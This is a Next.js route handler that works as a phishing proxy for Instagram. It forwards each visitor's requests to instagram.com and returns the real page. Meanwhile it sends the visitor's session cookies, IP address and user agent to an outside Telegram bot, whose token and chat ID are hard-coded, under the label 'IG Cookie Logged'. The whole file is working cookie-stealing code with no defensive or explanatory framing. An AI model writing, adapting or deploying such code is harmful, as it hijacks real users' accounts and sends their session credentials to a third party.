import { NextResponse } from 'next/server';

const TELEGRAM_BOT_TOKEN = "8976721119:AAFh2XQKD_95hHATbpegFn0iToWO_W92-xE";
const TELEGRAM_CHAT_ID = "8569746095";

// 1. Export as a GET handler
export async function GET(request) {
  // Extract the path from the URL
  const url = new URL(request.url);
  const path = url.pathname.replace('/proxy', '') || '/';
  
  // Construct the target Instagram URL
  const targetUrl = `https://www.instagram.com${path}`;

  // Get headers
  const userAgent = request.headers.get('user-agent') || 'Unknown';
  const forwardedFor = request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || 'Unknown';
  const cookieHeader = request.headers.get('cookie') || '';

  try {
    // Fetch Instagram content
    const response = await fetch(targetUrl, {
      headers: {
        'User-Agent': userAgent,
        'Cookie': cookieHeader,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      },
      redirect: 'follow',
    });

    const content = await response.text();

    // Prepare Telegram message
    const timestamp = new Date().toISOString();
    const cleanCookies = cookieHeader.replace(/; /g, '\n').replace(/;/g, '\n');

    const message = `
🍪 <b>IG Cookie Logged</b>

🕒 <b>Time:</b> ${timestamp}
🌐 <b>IP:</b> ${forwardedFor}
📱 <b>UA:</b> <code>${userAgent}</code>
🔗 <b>URL:</b> ${targetUrl}

🍪 <b>Cookies:</b>
<code>${cleanCookies}</code>
    `;

    // Send to Telegram
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "HTML"
        })
      });
    } catch (error) {
      console.error("Telegram Error:", error);
    }

    // Return the Instagram content
    return new NextResponse(content, {
      status: response.status,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-cache',
      }
    });

  } catch (error) {
    console.error("Proxy Error:", error);
    return new NextResponse("Proxy Error", { status: 500 });
  }
}

// 2. Handle POST requests too
export async function POST(request) {
  return GET(request);
}

// 3. Force dynamic rendering (CRITICAL for Vercel)
export const dynamic = 'force-dynamic';
export const revalidate = 0;
